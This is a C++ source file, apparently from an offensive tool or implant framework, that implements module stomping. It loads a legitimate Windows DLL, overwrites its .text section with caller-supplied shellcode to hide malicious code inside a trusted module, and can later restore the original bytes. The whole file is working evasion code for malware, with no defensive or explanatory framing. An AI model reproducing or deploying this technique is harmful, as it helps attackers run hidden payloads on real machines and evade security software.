#include "module_stomping.h"
#include "../utils/logger.h"
#include <vector>

static HMODULE g_stompedModule = nullptr;
static BYTE* g_stompedText = nullptr;
static SIZE_T g_stompedSize = 0;
static std::vector<BYTE> g_originalBytes;

bool ModuleStomping::Stomp(const wchar_t* moduleName, const BYTE* shellcode, SIZE_T size)
{
    HMODULE hMod = LoadLibraryW(moduleName);
    if (!hMod) return false;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++)
    {
        if (memcmp(pSection[i].Name, ".text", 5) == 0)
        {
            g_stompedText = (BYTE*)hMod + pSection[i].VirtualAddress;
            g_stompedSize = pSection[i].Misc.VirtualSize;
            g_originalBytes.assign(g_stompedText, g_stompedText + g_stompedSize);

            DWORD oldProtect;
            VirtualProtect(g_stompedText, g_stompedSize, PAGE_READWRITE, &oldProtect);
            memcpy(g_stompedText, shellcode, min(size, g_stompedSize));
            VirtualProtect(g_stompedText, g_stompedSize, oldProtect, &oldProtect);

            g_stompedModule = hMod;
            LOG_INFO(L"Module Stomping: %ls (0x%p)", moduleName, g_stompedText);
            return true;
        }
    }
    FreeLibrary(hMod);
    return false;
}

void ModuleStomping::Restore()
{
    if (!g_stompedModule || g_originalBytes.empty()) return;
    DWORD oldProtect;
    VirtualProtect(g_stompedText, g_stompedSize, PAGE_READWRITE, &oldProtect);
    memcpy(g_stompedText, g_originalBytes.data(), g_originalBytes.size());
    VirtualProtect(g_stompedText, g_stompedSize, oldProtect, &oldProtect);
    LOG_INFO(L"Module Stomping restaurado");
    g_stompedModule = nullptr;
    g_stompedText = nullptr;
    g_stompedSize = 0;
    g_originalBytes.clear();
}